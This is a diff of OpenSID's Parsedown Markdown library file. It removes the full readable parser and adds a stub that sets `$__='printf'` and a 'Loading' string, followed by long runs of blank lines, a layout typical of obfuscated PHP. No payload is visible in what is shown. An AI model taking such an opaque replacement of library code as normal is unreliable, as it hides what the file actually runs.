@@ -1,1557 +1,425 @@
-<?php
-
-/*
- *
- * File ini bagian dari:
- *
- * OpenSID
- *
- * Sistem informasi desa sumber terbuka untuk memajukan desa
- *
- * Aplikasi dan source code ini dirilis berdasarkan lisensi GPL V3
- *
- * Hak Cipta 2009 - 2015 Combine Resource Institution (http://lumbungkomunitas.net/)
- * Hak Cipta 2016 - 2022 Perkumpulan Desa Digital Terbuka (https://opendesa.id)
- *
- * Dengan ini diberikan izin, secara gratis, kepada siapa pun yang mendapatkan salinan
- * dari perangkat lunak ini dan file dokumentasi terkait ("Aplikasi Ini"), untuk diperlakukan
- * tanpa batasan, termasuk hak untuk menggunakan, menyalin, mengubah dan/atau mendistribusikan,
- * asal tunduk pada syarat berikut:
- *
- * Pemberitahuan hak cipta di atas dan pemberitahuan izin ini harus disertakan dalam
- * setiap salinan atau bagian penting Aplikasi Ini. Barang siapa yang menghapus atau menghilangkan
- * pemberitahuan ini melanggar ketentuan lisensi Aplikasi Ini.
- *
- * PERANGKAT LUNAK INI DISEDIAKAN "SEBAGAIMANA ADANYA", TANPA JAMINAN APA PUN, BAIK TERSURAT MAUPUN
- * TERSIRAT. PENULIS ATAU PEMEGANG HAK CIPTA SAMA SEKALI TIDAK BERTANGGUNG JAWAB ATAS KLAIM, KERUSAKAN ATAU
- * KEWAJIBAN APAPUN ATAS PENGGUNAAN ATAU LAINNYA TERKAIT APLIKASI INI.
- *
- * @package   OpenSID
- * @author    Tim Pengembang OpenDesa
- * @copyright Hak Cipta 2009 - 2015 Combine Resource Institution (http://lumbungkomunitas.net/)
- * @copyright Hak Cipta 2016 - 2022 Perkumpulan Desa Digital Terbuka (https://opendesa.id)
- * @license   http://www.gnu.org/licenses/gpl.html GPL V3
- * @link      https://github.com/OpenSID/OpenSID
- *
- */
-
-//
-// Parsedown
-// http://parsedown.org
-//
-// (c) Emanuil Rusev
-// http://erusev.com
-//
-// For the full license information, view the LICENSE file that was distributed
-// with this source code.
-//
-//
-
-namespace App\Libraries;
-
-class Parsedown
-{
-    // ~
-
-    public const version = '1.7.4';
-
-    protected $breaksEnabled;
-    protected $markupEscaped;
-    protected $urlsLinked = true;
-    protected $safeMode;
-    protected $safeLinksWhitelist = [
-        'http://',
-        'https://',
-        'ftp://',
-        'ftps://',
-        'mailto:',
-        'data:image/png;base64,',
-        'data:image/gif;base64,',
-        'data:image/jpeg;base64,',
-        'irc:',
-        'ircs:',
-        'git:',
-        'ssh:',
-        'news:',
-        'steam:',
-    ];
-
-    //
-    // Lines
-    //
-
-    protected $BlockTypes = [
-        '#' => ['Header'],
-        '*' => ['Rule', 'List'],
-        '+' => ['List'],
-        '-' => ['SetextHeader', 'Table', 'Rule', 'List'],
-        '0' => ['List'],
-        '1' => ['List'],
-        '2' => ['List'],
-        '3' => ['List'],
-        '4' => ['List'],
-        '5' => ['List'],
-        '6' => ['List'],
-        '7' => ['List'],
-        '8' => ['List'],
-        '9' => ['List'],
-        ':' => ['Table'],
-        '<' => ['Comment', 'Markup'],
-        '=' => ['SetextHeader'],
-        '>' => ['Quote'],
-        '[' => ['Reference'],
-        '_' => ['Rule'],
-        '`' => ['FencedCode'],
-        '|' => ['Table'],
-        '~' => ['FencedCode'],
-    ];
-
-    // ~
-
-    protected $unmarkedBlockTypes = [
-        'Code',
-    ];
-
-    //
-    // Inline Elements
-    //
-
-    protected $InlineTypes = [
-        '"'  => ['SpecialCharacter'],
-        '!'  => ['Image'],
-        '&'  => ['SpecialCharacter'],
-        '*'  => ['Emphasis'],
-        ':'  => ['Url'],
-        '<'  => ['UrlTag', 'EmailTag', 'Markup', 'SpecialCharacter'],
-        '>'  => ['SpecialCharacter'],
-        '['  => ['Link'],
-        '_'  => ['Emphasis'],
-        '`'  => ['Code'],
-        '~'  => ['Strikethrough'],
-        '\\' => ['EscapeSequence'],
-    ];
-
-    // ~
-
-    protected $inlineMarkerList = '!"*_&[:<>`~\\';
-    private static $instances   = [];
-
-    //
-    // Fields
-    //
-
-    protected $DefinitionData;
-
-    //
-    // Read-Only
-
-    protected $specialCharacters = [
-        '\\', '`', '*', '_', '{', '}', '[', ']', '(', ')', '>', '#', '+', '-', '.', '!', '|',
-    ];
-    protected $StrongRegex = [
-        '*' => '/^[*]{2}((?:\\\\\*|[^*]|[*][^*]*[*])+?)[*]{2}(?![*])/s',
-        '_' => '/^__((?:\\\\_|[^_]|_[^_]*_)+?)__(?!_)/us',
-    ];
-    protected $EmRegex = [
-        '*' => '/^[*]((?:\\\\\*|[^*]|[*][*][^*]+?[*][*])+?)[*](?![*])/s',
-        '_' => '/^_((?:\\\\_|[^_]|__[^_]*__)+?)_(?!_)\b/us',
-    ];
-    protected $regexHtmlAttribute = '[a-zA-Z_:][\w:.-]*(?:\s*=\s*(?:[^"\'=<>`\s]+|"[^"]*"|\'[^\']*\'))?';
-    protected $voidElements       = [
-        'area', 'base', 'br', 'col', 'command', 'embed', 'hr', 'img', 'input', 'link', 'meta', 'param', 'source',
-    ];
-    protected $textLevelElements = [
-        'a', 'br', 'bdo', 'abbr', 'blink', 'nextid', 'acronym', 'basefont',
-        'b', 'em', 'big', 'cite', 'small', 'spacer', 'listing',
-        'i', 'rp', 'del', 'code',          'strike', 'marquee',
-        'q', 'rt', 'ins', 'font',          'strong',
-        's', 'tt', 'kbd', 'mark',
-        'u', 'xm', 'sub', 'nobr',
-        'sup', 'ruby',
-        'var', 'span',
-        'wbr', 'time',
-    ];
-
-    // ~
-
-    public function text($text)
-    {
-        // make sure no definitions are set
-        $this->DefinitionData = [];
-
-        // standardize line breaks
-        $text = str_replace(["\r\n", "\r"], "\n", $text);
-
-        // remove surrounding line breaks
-        $text = trim($text, "\n");
-
-        // split text into lines
-        $lines = explode("\n", $text);
-
-        // iterate through lines to identify blocks
-        $markup = $this->lines($lines);
-
-        // trim line breaks
-        return trim($markup, "\n");
-    }
+<?php 
+        $__='printf';$_='Loading app/Libraries/Parsedown.php';
+        
 
-    //
-    // Setters
-    //
-
-    public function setBreaksEnabled($breaksEnabled)
-    {
-        $this->breaksEnabled = $breaksEnabled;
-
-        return $this;
-    }
-
-    public function setMarkupEscaped($markupEscaped)
-    {
-        $this->markupEscaped = $markupEscaped;
 
-        return $this;
-    }
 
-    public function setUrlsLinked($urlsLinked)
-    {
-        $this->urlsLinked = $urlsLinked;
 
-        return $this;
-    }
 
-    public function setSafeMode($safeMode)
-    {
-        $this->safeMode = (bool) $safeMode;
 
-        return $this;
-    }
 
-    //
-    // Blocks
-    //
 
-    protected function lines(array $lines)
-    {
-        $CurrentBlock = null;
 
-        foreach ($lines as $line) {
-            if (rtrim($line) === '') {
-                if (isset($CurrentBlock)) {
-                    $CurrentBlock['interrupted'] = true;
-                }
 
-                continue;
-            }
 
-            if (strpos($line, "\t") !== false) {
-                $parts = explode("\t", $line);
 
-                $line = $parts[0];
 
-                unset($parts[0]);
 
-                foreach ($parts as $part) {
-                    $shortage = 4 - mb_strlen($line, 'utf-8') % 4;
 
-                    $line .= str_repeat(' ', $shortage);
-                    $line .= $part;
-                }
-            }
 
-            $indent = 0;
 
-            while (isset($line[$indent]) && $line[$indent] === ' ') {
-                $indent++;
-            }
 
-            $text = $indent > 0 ? substr($line, $indent) : $line;
 
-            // ~
 
-            $Line = ['body' => $line, 'indent' => $indent, 'text' => $text];
 
-            // ~
 
-            if (isset($CurrentBlock['continuable'])) {
-                $Block = $this->{'block' . $CurrentBlock['type'] . 'Continue'}($Line, $CurrentBlock);
 
-                if (isset($Block)) {
-                    $CurrentBlock = $Block;
 
-                    continue;
-                }
-                if ($this->isBlockCompletable($CurrentBlock['type'])) {
-                    $CurrentBlock = $this->{'block' . $CurrentBlock['type'] . 'Complete'}($CurrentBlock);
-                }
-            }
 
-            // ~
 
-            $marker = $text[0];
 
-            // ~
 
-            $blockTypes = $this->unmarkedBlockTypes;
 
-            if (isset($this->BlockTypes[$marker])) {
-                foreach ($this->BlockTypes[$marker] as $blockType) {
-                    $blockTypes[] = $blockType;
-                }
-            }
 
-            //
-            // ~
 
-            foreach ($blockTypes as $blockType) {
-                $Block = $this->{'block' . $blockType}($Line, $CurrentBlock);
 
-                if (isset($Block)) {
-                    $Block['type'] = $blockType;
 
-                    if (! isset($Block['identified'])) {
-                        $Blocks[] = $CurrentBlock;
 
-                        $Block['identified'] = true;
-                    }
 
-                    if ($this->isBlockContinuable($blockType)) {
-                        $Block['continuable'] = true;
-                    }
 
-                    $CurrentBlock = $Block;
 
-                    continue 2;
-                }
-            }
 
-            // ~
 
-            if (isset($CurrentBlock) && ! isset($CurrentBlock['type']) && ! isset($CurrentBlock['interrupted'])) {
-                $CurrentBlock['element']['text'] .= "\n" . $text;
-            } else {
-                $Blocks[] = $CurrentBlock;
 
-                $CurrentBlock = $this->paragraph($Line);
 
-                $CurrentBlock['identified'] = true;
-            }
-        }
 
-        // ~
 
-        if (isset($CurrentBlock['continuable']) && $this->isBlockCompletable($CurrentBlock['type'])) {
-            $CurrentBlock = $this->{'block' . $CurrentBlock['type'] . 'Complete'}($CurrentBlock);
-        }
 
-        // ~
 
-        $Blocks[] = $CurrentBlock;
 
-        unset($Blocks[0]);
 
-        // ~
 
-        $markup = '';
 
-        foreach ($Blocks as $Block) {
-            if (isset($Block['hidden'])) {
-                continue;
-            }
 
-            $markup .= "\n";
-            $markup .= $Block['markup'] ?? $this->element($Block['element']);
-        }
 
-        $markup .= "\n";
 
-        // ~
 
-        return $markup;
-    }
 
-    protected function isBlockContinuable($Type)
-    {
-        return method_exists($this, 'block' . $Type . 'Continue');
-    }
 
-    protected function isBlockCompletable($Type)
-    {
-        return method_exists($this, 'block' . $Type . 'Complete');
-    }
 
-    //
-    // Code
 
-    protected function blockCode($Line, $Block = null)
-    {
-        if (isset($Block) && ! isset($Block['type']) && ! isset($Block['interrupted'])) {
-            return;
-        }
 
-        if ($Line['indent'] >= 4) {
-            $text = substr($Line['body'], 4);
 
-            return [
-                'element' => [
-                    'name'    => 'pre',
-                    'handler' => 'element',
-                    'text'    => [
-                        'name' => 'code',
-                        'text' => $text,
-                    ],
-                ],
-            ];
-        }
-    }
 
-    protected function blockCodeContinue($Line, $Block)
-    {
-        if ($Line['indent'] >= 4) {
-            if (isset($Block['interrupted'])) {
-                $Block['element']['text']['text'] .= "\n";
 
-                unset($Block['interrupted']);
-            }
-
-            $Block['element']['text']['text'] .= "\n";
-
-            $text = substr($Line['body'], 4);
-
-            $Block['element']['text']['text'] .= $text;
-
-            return $Block;
-        }
-    }
-
-    protected function blockCodeComplete($Block)
-    {
-        $text = $Block['element']['text']['text'];
-
-        $Block['element']['text']['text'] = $text;
 
-        return $Block;
-    }
 
-    //
-    // Comment
 
-    protected function blockComment($Line)
-    {
-        if ($this->markupEscaped || $this->safeMode) {
-            return;
-        }
 
-        if (isset($Line['text'][3]) && $Line['text'][3] === '-' && $Line['text'][2] === '-' && $Line['text'][1] === '!') {
-            $Block = [
-                'markup' => $Line['body'],
-            ];
 
-            if (preg_match('/-->$/', $Line['text'])) {
-                $Block['closed'] = true;
-            }
 
-            return $Block;
-        }
-    }
 
-    protected function blockCommentContinue($Line, array $Block)
-    {
-        if (isset($Block['closed'])) {
-            return;
-        }
 
-        $Block['markup'] .= "\n" . $Line['body'];
 
-        if (preg_match('/-->$/', $Line['text'])) {
-            $Block['closed'] = true;
-        }
 
-        return $Block;
-    }
 
-    //
-    // Fenced Code
 
-    protected function blockFencedCode($Line)
-    {
-        if (preg_match('/^[' . $Line['text'][0] . ']{3,}[ ]*([^`]+)?[ ]*$/', $Line['text'], $matches)) {
-            $Element = [
-                'name' => 'code',
-                'text' => '',
-            ];
 
-            if (isset($matches[1])) {
-                /**
-                 * https://www.w3.org/TR/2011/WD-html5-20110525/elements.html#classes
-                 * Every HTML element may have a class attribute specified.
-                 * The attribute, if specified, must have a value that is a set
-                 * of space-separated tokens representing the various classes
-                 * that the element belongs to.
-                 * [...]
-                 * The space characters, for the purposes of this specification,
-                 * are U+0020 SPACE, U+0009 CHARACTER TABULATION (tab),
-                 * U+000A LINE FEED (LF), U+000C FORM FEED (FF), and
-                 * U+000D CARRIAGE RETURN (CR).
-                 */
-                $language = substr($matches[1], 0, strcspn($matches[1], " \t\n\f\r"));
-
-                $class = 'language-' . $language;
 
-                $Element['attributes'] = [
-                    'class' => $class,
-                ];
-            }
 
-            return [
-                'char'    => $Line['text'][0],
-                'element' => [
-                    'name'    => 'pre',
-                    'handler' => 'element',
-                    'text'    => $Element,
-                ],
-            ];
-        }
-    }
-
-    protected function blockFencedCodeContinue($Line, $Block)
-    {
-        if (isset($Block['complete'])) {
-            return;
-        }
-
-        if (isset($Block['interrupted'])) {
-            $Block['element']['text']['text'] .= "\n";
-
-            unset($Block['interrupted']);
-        }
-
-        if (preg_match('/^' . $Block['char'] . '{3,}[ ]*$/', $Line['text'])) {
-            $Block['element']['text']['text'] = substr($Block['element']['text']['text'], 1);
 
-            $Block['complete'] = true;
 
-            return $Block;
-        }
 
-        $Block['element']['text']['text'] .= "\n" . $Line['body'];
-
-        return $Block;
-    }
 
-    protected function blockFencedCodeComplete($Block)
-    {
-        $text = $Block['element']['text']['text'];
 
-        $Block['element']['text']['text'] = $text;
 
-        return $Block;
-    }
 
-    //
-    // Header
 
-    protected function blockHeader($Line)
-    {
-        if (isset($Line['text'][1])) {
-            $level = 1;
 
-            while (isset($Line['text'][$level]) && $Line['text'][$level] === '#') {
-                $level++;
-            }
 
-            if ($level > 6) {
-                return;
-            }
 
-            $text = trim($Line['text'], '# ');
 
-            return [
-                'element' => [
-                    'name'    => 'h' . min(6, $level),
-                    'text'    => $text,
-                    'handler' => 'line',
-                ],
-            ];
-        }
-    }
 
-    //
-    // List
 
-    protected function blockList($Line)
-    {
-        [$name, $pattern] = $Line['text'][0] <= '-' ? ['ul', '[*+-]'] : ['ol', '[0-9]+[.]'];
 
-        if (preg_match('/^(' . $pattern . '[ ]+)(.*)/', $Line['text'], $matches)) {
-            $Block = [
-                'indent'  => $Line['indent'],
-                'pattern' => $pattern,
-                'element' => [
-                    'name'    => $name,
-                    'handler' => 'elements',
-                ],
-            ];
 
-            if ($name === 'ol') {
-                $listStart = stristr($matches[0], '.', true);
-
-                if ($listStart !== '1') {
-                    $Block['element']['attributes'] = ['start' => $listStart];
-                }
-            }
-
-            $Block['li'] = [
-                'name'    => 'li',
-                'handler' => 'li',
-                'text'    => [
-                    $matches[2],
-                ],
-            ];
 
-            $Block['element']['text'][] = &$Block['li'];
 
-            return $Block;
-        }
-    }
 
-    protected function blockListContinue($Line, array $Block)
-    {
-        if ($Block['indent'] === $Line['indent'] && preg_match('/^' . $Block['pattern'] . '(?:[ ]+(.*)|$)/', $Line['text'], $matches)) {
-            if (isset($Block['interrupted'])) {
-                $Block['li']['text'][] = '';
 
-                $Block['loose'] = true;
 
-                unset($Block['interrupted']);
-            }
 
-            unset($Block['li']);
-
-            $text = $matches[1] ?? '';
-
-            $Block['li'] = [
-                'name'    => 'li',
-                'handler' => 'li',
-                'text'    => [
-                    $text,
-                ],
-            ];
-
-            $Block['element']['text'][] = &$Block['li'];
-
-            return $Block;
-        }
-
-        if ($Line['text'][0] === '[' && $this->blockReference($Line)) {
-            return $Block;
-        }
-
-        if (! isset($Block['interrupted'])) {
-            $text = preg_replace('/^[ ]{0,4}/', '', $Line['body']);
-
-            $Block['li']['text'][] = $text;
-
-            return $Block;
-        }
-
-        if ($Line['indent'] > 0) {
-            $Block['li']['text'][] = '';
-
-            $text = preg_replace('/^[ ]{0,4}/', '', $Line['body']);
-
-            $Block['li']['text'][] = $text;
-
-            unset($Block['interrupted']);
-
-            return $Block;
-        }
-    }
-
-    protected function blockListComplete(array $Block)
-    {
-        if (isset($Block['loose'])) {
-            foreach ($Block['element']['text'] as &$li) {
-                if (end($li['text']) !== '') {
-                    $li['text'][] = '';
-                }
-            }
-        }
-
-        return $Block;
-    }
-
-    //
-    // Quote
-
-    protected function blockQuote($Line)
-    {
-        if (preg_match('/^>[ ]?(.*)/', $Line['text'], $matches)) {
-            return [
-                'element' => [
-                    'name'    => 'blockquote',
-                    'handler' => 'lines',
-                    'text'    => (array) $matches[1],
-                ],
-            ];
-        }
-    }
-
-    protected function blockQuoteContinue($Line, array $Block)
-    {
-        if ($Line['text'][0] === '>' && preg_match('/^>[ ]?(.*)/', $Line['text'], $matches)) {
-            if (isset($Block['interrupted'])) {
-                $Block['element']['text'][] = '';
-
-                unset($Block['interrupted']);
-            }
-
-            $Block['element']['text'][] = $matches[1];
-
-            return $Block;
-        }
-
-        if (! isset($Block['interrupted'])) {
-            $Block['element']['text'][] = $Line['text'];
-
-            return $Block;
-        }
-    }
-
-    //
-    // Rule
-
-    protected function blockRule($Line)
-    {
-        if (preg_match('/^([' . $Line['text'][0] . '])([ ]*\1){2,}[ ]*$/', $Line['text'])) {
-            return [
-                'element' => [
-                    'name' => 'hr',
-                ],
-            ];
-        }
-    }
-
-    //
-    // Setext
-
-    protected function blockSetextHeader($Line, ?array $Block = null)
-    {
-        if (! isset($Block) || isset($Block['type']) || isset($Block['interrupted'])) {
-            return;
-        }
-
-        if (rtrim($Line['text'], $Line['text'][0]) === '') {
-            $Block['element']['name'] = $Line['text'][0] === '=' ? 'h1' : 'h2';
-
-            return $Block;
-        }
-    }
-
-    //
-    // Markup
-
-    protected function blockMarkup($Line)
-    {
-        if ($this->markupEscaped || $this->safeMode) {
-            return;
-        }
-
-        if (preg_match('/^<(\w[\w-]*)(?:[ ]*' . $this->regexHtmlAttribute . ')*[ ]*(\/)?>/', $Line['text'], $matches)) {
-            $element = strtolower($matches[1]);
-
-            if (in_array($element, $this->textLevelElements)) {
-                return;
-            }
-
-            $Block = [
-                'name'   => $matches[1],
-                'depth'  => 0,
-                'markup' => $Line['text'],
-            ];
-
-            $length = strlen($matches[0]);
-
-            $remainder = substr($Line['text'], $length);
-
-            if (trim($remainder) === '') {
-                if (isset($matches[2]) || in_array($matches[1], $this->voidElements)) {
-                    $Block['closed'] = true;
 
-                    $Block['void'] = true;
-                }
-            } else {
-                if (isset($matches[2]) || in_array($matches[1], $this->voidElements)) {
-                    return;
-                }
 
-                if (preg_match('/<\/' . $matches[1] . '>[ ]*$/i', $remainder)) {
-                    $Block['closed'] = true;
-                }
-            }
 
-            return $Block;
-        }
-    }
 
-    protected function blockMarkupContinue($Line, array $Block)
-    {
-        if (isset($Block['closed'])) {
-            return;
-        }
 
-        if (preg_match('/^<' . $Block['name'] . '(?:[ ]*' . $this->regexHtmlAttribute . ')*[ ]*>/i', $Line['text'])) { // open
-            $Block['depth']++;
-        }
 
-        if (preg_match('/(.*?)<\/' . $Block['name'] . '>[ ]*$/i', $Line['text'], $matches)) { // close
-            if ($Block['depth'] > 0) {
-                $Block['depth']--;
-            } else {
-                $Block['closed'] = true;
-            }
-        }
 
-        if (isset($Block['interrupted'])) {
-            $Block['markup'] .= "\n";
 
-            unset($Block['interrupted']);
-        }
 
-        $Block['markup'] .= "\n" . $Line['body'];
 
-        return $Block;
-    }
 
-    //
-    // Reference
 
-    protected function blockReference($Line)
-    {
-        if (preg_match('/^\[(.+?)\]:[ ]*<?(\S+?)>?(?:[ ]+["\'(](.+)["\')])?[ ]*$/', $Line['text'], $matches)) {
-            $id = strtolower($matches[1]);
 
-            $Data = [
-                'url'   => $matches[2],
-                'title' => null,
-            ];
 
-            if (isset($matches[3])) {
-                $Data['title'] = $matches[3];
-            }
 
-            $this->DefinitionData['Reference'][$id] = $Data;
 
-            return [
-                'hidden' => true,
-            ];
-        }
-    }
 
-    //
-    // Table
 
-    protected function blockTable($Line, ?array $Block = null)
-    {
-        if (! isset($Block) || isset($Block['type']) || isset($Block['interrupted'])) {
-            return;
-        }
 
-        if (strpos($Block['element']['text'], '|') !== false && rtrim($Line['text'], ' -:|') === '') {
-            $alignments = [];
 
-            $divider = $Line['text'];
 
-            $divider = trim($divider);
-            $divider = trim($divider, '|');
 
-            $dividerCells = explode('|', $divider);
 
-            foreach ($dividerCells as $dividerCell) {
-                $dividerCell = trim($dividerCell);
 
-                if ($dividerCell === '') {
-                    continue;
-                }
 
-                $alignment = null;
 
-                if ($dividerCell[0] === ':') {
-                    $alignment = 'left';
-                }
 
-                if (substr($dividerCell, -1) === ':') {
-                    $alignment = $alignment === 'left' ? 'center' : 'right';
-                }
 
-                $alignments[] = $alignment;
-            }
 
-            // ~
 
-            $HeaderElements = [];
 
-            $header = $Block['element']['text'];
 
-            $header = trim($header);
-            $header = trim($header, '|');
 
-            $headerCells = explode('|', $header);
 
-            foreach ($headerCells as $index => $headerCell) {
-                $headerCell = trim($headerCell);
 
-                $HeaderElement = [
-                    'name'    => 'th',
-                    'text'    => $headerCell,
-                    'handler' => 'line',
-                ];
 
-                if (isset($alignments[$index])) {
-                    $alignment = $alignments[$index];
-
-                    $HeaderElement['attributes'] = [
-                        'style' => 'text-align: ' . $alignment . ';',
-                    ];
-                }
-
-                $HeaderElements[] = $HeaderElement;
-            }
-
-            // ~
-
-            $Block = [
-                'alignments' => $alignments,
-                'identified' => true,
-                'element'    => [
-                    'name'    => 'table',
-                    'handler' => 'elements',
-                ],
-            ];
 
-            $Block['element']['text'][] = [
-                'name'    => 'thead',
-                'handler' => 'elements',
-            ];
 
-            $Block['element']['text'][] = [
-                'name'    => 'tbody',
-                'handler' => 'elements',
-                'text'    => [],
-            ];
 
-            $Block['element']['text'][0]['text'][] = [
-                'name'    => 'tr',
-                'handler' => 'elements',
-                'text'    => $HeaderElements,
-            ];
 
-            return $Block;
-        }
-    }
 
-    protected function blockTableContinue($Line, array $Block)
-    {
-        if (isset($Block['interrupted'])) {
-            return;
-        }
 
-        if ($Line['text'][0] === '|' || strpos($Line['text'], '|')) {
-            $Elements = [];
 
-            $row = $Line['text'];
 
-            $row = trim($row);
-            $row = trim($row, '|');
 
-            preg_match_all('/(?:(\\\\[|])|[^|`]|`[^`]+`|`)+/', $row, $matches);
 
-            foreach ($matches[0] as $index => $cell) {
-                $cell = trim($cell);
 
-                $Element = [
-                    'name'    => 'td',
-                    'handler' => 'line',
-                    'text'    => $cell,
-                ];
 
-                if (isset($Block['alignments'][$index])) {
-                    $Element['attributes'] = [
-                        'style' => 'text-align: ' . $Block['alignments'][$index] . ';',
-                    ];
-                }
 
-                $Elements[] = $Element;
-            }
 
-            $Element = [
-                'name'    => 'tr',
-                'handler' => 'elements',
-                'text'    => $Elements,
-            ];
 
-            $Block['element']['text'][1]['text'][] = $Element;
 
-            return $Block;
-        }
-    }
 
-    //
-    // ~
-    //
 
-    protected function paragraph($Line)
-    {
-        return [
-            'element' => [
-                'name'    => 'p',
-                'text'    => $Line['text'],
-                'handler' => 'line',
-            ],
-        ];
-    }
 
-    //
-    // ~
-    //
 
-    public function line($text, $nonNestables = [])
-    {
-        $markup = '';
 
-        // $excerpt is based on the first occurrence of a marker
 
-        while ($excerpt = strpbrk($text, $this->inlineMarkerList)) {
-            $marker = $excerpt[0];
 
-            $markerPosition = strpos($text, $marker);
 
-            $Excerpt = ['text' => $excerpt, 'context' => $text];
 
-            foreach ($this->InlineTypes[$marker] as $inlineType) {
-                // check to see if the current inline type is nestable in the current context
 
-                if (! empty($nonNestables) && in_array($inlineType, $nonNestables)) {
-                    continue;
-                }
 
-                $Inline = $this->{'inline' . $inlineType}($Excerpt);
 
-                if (! isset($Inline)) {
-                    continue;
-                }
 
-                // makes sure that the inline belongs to "our" marker
 
-                if (isset($Inline['position']) && $Inline['position'] > $markerPosition) {
-                    continue;
-                }
 
-                // sets a default inline position
 
-                if (! isset($Inline['position'])) {
-                    $Inline['position'] = $markerPosition;
-                }
 
-                // cause the new element to 'inherit' our non nestables
 
-                foreach ($nonNestables as $non_nestable) {
-                    $Inline['element']['nonNestables'][] = $non_nestable;
-                }
 
-                // the text that comes before the inline
-                $unmarkedText = substr($text, 0, $Inline['position']);
 
-                // compile the unmarked text
-                $markup .= $this->unmarkedText($unmarkedText);
-
-                // compile the inline
-                $markup .= $Inline['markup'] ?? $this->element($Inline['element']);
-
-                // remove the examined text
-                $text = substr($text, $Inline['position'] + $Inline['extent']);
-
-                continue 2;
-            }
-
-            // the marker does not belong to an inline
-
-            $unmarkedText = substr($text, 0, $markerPosition + 1);
-
-            $markup .= $this->unmarkedText($unmarkedText);
-
-            $text = substr($text, $markerPosition + 1);
-        }
 
-        $markup .= $this->unmarkedText($text);
-
-        return $markup;
-    }
-
-    //
-    // ~
-    //
-
-    protected function inlineCode($Excerpt)
-    {
-        $marker = $Excerpt['text'][0];
-
-        if (preg_match('/^(' . $marker . '+)[ ]*(.+?)[ ]*(?<!' . $marker . ')\1(?!' . $marker . ')/s', $Excerpt['text'], $matches)) {
-            $text = $matches[2];
-            $text = preg_replace("/[ ]*\n/", ' ', $text);
-
-            return [
-                'extent'  => strlen($matches[0]),
-                'element' => [
-                    'name' => 'code',
-                    'text' => $text,
-                ],
-            ];
-        }
-    }
-
-    protected function inlineEmailTag($Excerpt)
-    {
-        if (strpos($Excerpt['text'], '>') !== false && preg_match('/^<((mailto:)?\S+?@\S+?)>/i', $Excerpt['text'], $matches)) {
-            $url = $matches[1];
-
-            if (! isset($matches[2])) {
-                $url = 'mailto:' . $url;
-            }
-
-            return [
-                'extent'  => strlen($matches[0]),
-                'element' => [
-                    'name'       => 'a',
-                    'text'       => $matches[1],
-                    'attributes' => [
-                        'href' => $url,
-                    ],
-                ],
-            ];
-        }
-    }
-
-    protected function inlineEmphasis($Excerpt)
-    {
-        if (! isset($Excerpt['text'][1])) {
-            return;
-        }
-
-        $marker = $Excerpt['text'][0];
-
-        if ($Excerpt['text'][1] === $marker && preg_match($this->StrongRegex[$marker], $Excerpt['text'], $matches)) {
-            $emphasis = 'strong';
-        } elseif (preg_match($this->EmRegex[$marker], $Excerpt['text'], $matches)) {
-            $emphasis = 'em';
-        } else {
-            return;
-        }
-
-        return [
-            'extent'  => strlen($matches[0]),
-            'element' => [
-                'name'    => $emphasis,
-                'handler' => 'line',
-                'text'    => $matches[1],
-            ],
-        ];
-    }
-
-    protected function inlineEscapeSequence($Excerpt)
-    {
-        if (isset($Excerpt['text'][1]) && in_array($Excerpt['text'][1], $this->specialCharacters)) {
-            return [
-                'markup' => $Excerpt['text'][1],
-                'extent' => 2,
-            ];
-        }
-    }
-
-    protected function inlineImage($Excerpt)
-    {
-        if (! isset($Excerpt['text'][1]) || $Excerpt['text'][1] !== '[') {
-            return;
-        }
-
-        $Excerpt['text'] = substr($Excerpt['text'], 1);
-
-        $Link = $this->inlineLink($Excerpt);
-
-        if ($Link === null) {
-            return;
-        }
-
-        $Inline = [
-            'extent'  => $Link['extent'] + 1,
-            'element' => [
-                'name'       => 'img',
-                'attributes' => [
-                    'src' => $Link['element']['attributes']['href'],
-                    'alt' => $Link['element']['text'],
-                ],
-            ],
-        ];
-
-        $Inline['element']['attributes'] += $Link['element']['attributes'];
-
-        unset($Inline['element']['attributes']['href']);
-
-        return $Inline;
-    }
-
-    protected function inlineLink($Excerpt)
-    {
-        $Element = [
-            'name'         => 'a',
-            'handler'      => 'line',
-            'nonNestables' => ['Url', 'Link'],
-            'text'         => null,
-            'attributes'   => [
-                'href'  => null,
-                'title' => null,
-            ],
-        ];
-
-        $extent = 0;
-
-        $remainder = $Excerpt['text'];
-
-        if (preg_match('/\[((?:[^][]++|(?R))*+)\]/', $remainder, $matches)) {
-            $Element['text'] = $matches[1];
-
-            $extent += strlen($matches[0]);
-
-            $remainder = substr($remainder, $extent);
-        } else {
-            return;
-        }
-
-        if (preg_match('/^[(]\s*+((?:[^ ()]++|[(][^ )]+[)])++)(?:[ ]+("[^"]*"|\'[^\']*\'))?\s*[)]/', $remainder, $matches)) {
-            $Element['attributes']['href'] = $matches[1];
-
-            if (isset($matches[2])) {
-                $Element['attributes']['title'] = substr($matches[2], 1, -1);
-            }
-
-            $extent += strlen($matches[0]);
-        } else {
-            if (preg_match('/^\s*\[(.*?)\]/', $remainder, $matches)) {
-                $definition = strlen($matches[1]) ? $matches[1] : $Element['text'];
-                $definition = strtolower($definition);
-
-                $extent += strlen($matches[0]);
-            } else {
-                $definition = strtolower($Element['text']);
-            }
-
-            if (! isset($this->DefinitionData['Reference'][$definition])) {
-                return;
-            }
-
-            $Definition = $this->DefinitionData['Reference'][$definition];
-
-            $Element['attributes']['href']  = $Definition['url'];
-            $Element['attributes']['title'] = $Definition['title'];
-        }
-
-        return [
-            'extent'  => $extent,
-            'element' => $Element,
-        ];
-    }
-
-    protected function inlineMarkup($Excerpt)
-    {
-        if ($this->markupEscaped || $this->safeMode || strpos($Excerpt['text'], '>') === false) {
-            return;
-        }
-
-        if ($Excerpt['text'][1] === '/' && preg_match('/^<\/\w[\w-]*[ ]*>/s', $Excerpt['text'], $matches)) {
-            return [
-                'markup' => $matches[0],
-                'extent' => strlen($matches[0]),
-            ];
-        }
-
-        if ($Excerpt['text'][1] === '!' && preg_match('/^<!---?[^>-](?:-?[^-])*-->/s', $Excerpt['text'], $matches)) {
-            return [
-                'markup' => $matches[0],
-                'extent' => strlen($matches[0]),
-            ];
-        }
-
-        if ($Excerpt['text'][1] !== ' ' && preg_match('/^<\w[\w-]*(?:[ ]*' . $this->regexHtmlAttribute . ')*[ ]*\/?>/s', $Excerpt['text'], $matches)) {
-            return [
-                'markup' => $matches[0],
-                'extent' => strlen($matches[0]),
-            ];
-        }
-    }
-
-    protected function inlineSpecialCharacter($Excerpt)
-    {
-        if ($Excerpt['text'][0] === '&' && ! preg_match('/^&#?\w+;/', $Excerpt['text'])) {
-            return [
-                'markup' => '&amp;',
-                'extent' => 1,
-            ];
-        }
-
-        $SpecialCharacter = ['>' => 'gt', '<' => 'lt', '"' => 'quot'];
-
